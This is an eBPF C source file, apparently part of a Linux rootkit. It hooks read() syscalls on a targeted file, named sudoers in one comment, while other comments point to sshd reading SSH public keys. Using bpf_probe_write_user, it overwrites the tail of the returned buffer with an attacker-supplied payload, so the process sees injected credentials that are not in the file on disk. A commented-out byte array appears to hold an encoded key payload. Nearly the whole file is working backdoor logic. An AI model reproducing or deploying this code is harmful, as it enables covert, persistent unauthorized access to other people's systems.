#include "./common.h"
#include "./maps.h"
SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    unsigned int *pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0)
    {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd)
    {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    /*
name: sys_enter_read
ID: 624
format:
        field:unsigned short common_type;       offset:0;       size:2; signed:0;
        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
        field:int common_pid;   offset:4;       size:4; signed:1;

        field:int __syscall_nr; offset:8;       size:4; signed:1;
        field:unsigned int fd;  offset:16;      size:8; signed:0;
        field:char * buf;       offset:24;      size:8; signed:0;
        field:size_t count;     offset:32;      size:8; signed:0;

        == = = ====  8
        ==== ----    16
        ========     24 fd
        ========     32 buf
        ========     40 count
    */
    size_t size = ctx->args[2];
    struct syscall_read_logging data;
    data.buffer_addr = buff_addr;
    data.calling_size = size;
    // bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &data, BPF_ANY);
    // log and exit
    // size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    bpf_printk("The read Exit Called\n");
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // [DEBUG] int pid = pid_tgid >> 32;
    struct syscall_read_logging *data;
    data = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    // long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    // if (pbuff_addr == 0)
    if (data == 0)
    {
        return 0;
    }
    // long unsigned int buff_addr = *pbuff_addr;
    long unsigned int buff_addr = data->buffer_addr;
    if (buff_addr <= 0)
    {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0)
    {
        return 0;
    }
    long int read_size = ctx->ret;
    // long int read_size = ctx->ret;

    // Add our payload to the end and with '\n'
    // read_size less than payload, we can't write in the buffer
    // read_size == 4096 read max when sshd read.
    if (read_size < max_payload_len || read_size == data->calling_size ) {
        return 0;
    }
    // |<--------- raw content ------->|\n|<------------ payload ------------->|
    // |<----------------------------- ret_size ------------------------------>|
    // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
    // char local_buff[max_payload_len] = {0x0a, 67,63,40,67,63,40,66,70,40,62,104,40,66,65,40,66,64,40,63,62,40,63,65,40,63,65,40,63,61,40,63,71,40,62,60,40,64,61,40,64,61,40,64,61,40,64,61,40,64,63,40,63,63,40,64,105,40,67,101,40,66,61,40,64,63,40,63,61,40,66,103,40,65,101,40,64,64,40,64,71,40,63,61,40,64,105,40,65,64,40,64,65,40,63,65,40,64,61,40,64,61,40,64,61,40,64,61,40,64,71,40,64,104,40,67,101,40,64,66,40,66,65,40,65,60,40,64,104,40,63,60,40,67,65,40,63,71,40,63,62,40,64,105,40,66,101,40,67,60,40,64,63,40,64,101,40,63,63,40,65,64,40,67,66,40,64,67,40,64,71,40,65,71,40,63,64,40,64,63,40,66,71,40,66,64,40,67,101,40,65,64,40,65,64,40,65,62,40,66,106,40,64,65,40,67,101,40,64,105,40,66,64,40,66,104,40,64,103,40,64,105,40,65,65,40,67,70,40,66,63,40,64,105,40,64,105,40,64,63,40,62,60,40,67,62,40,66,106,40,66,106,40,67,64,40,64,60,40,66,62,40,63,61,40,63,61,40,63,64,40,63,65,40,63,61,40,63,64, 0x0a}; // clean buff
    char local_buff[max_payload_len] = {0x00};
    __u8 key = 0;
    struct custom_payload *payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
    long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len -1;
    // long unsigned int new_buff_addr = buff_addr + read_size - payload->payload_len -1;
    // char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
    // [DEBUG] 
    // char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
    // char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
    // if (payload == 0 || payload->payload_len > max_payload_len || payload->payload_len <= 0 ) 
    if (payload == 0)
    {
        return 0;
    }
    local_buff[0] = '\n';
    // for (unsigned int i = 0; i < (payload->payload_len); i++)
    for (unsigned int i = 0; i < max_payload_len; i++)
    {
        // local_buf[i+1] = payload[i];
        local_buff[i + 1] = payload->raw_buf[i];
    }
    bpf_printk("%s\n", local_buff);
    bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
    // local_buff[payload->payload_len+1] = '\n';
    // local_buff[max_payload_len + 1] = '\0';
    //[DEBUG] long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
    // bpf_probe_write_user((void *)buff_addr, (void *)payload->raw_buf, payload->payload_len);
    // bpf_probe_write_user((void *)buff_addr, local_buff, payload_len);
    // Send event
    /*
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(struct event *), 0);
    if (e)
    {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    */
    // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}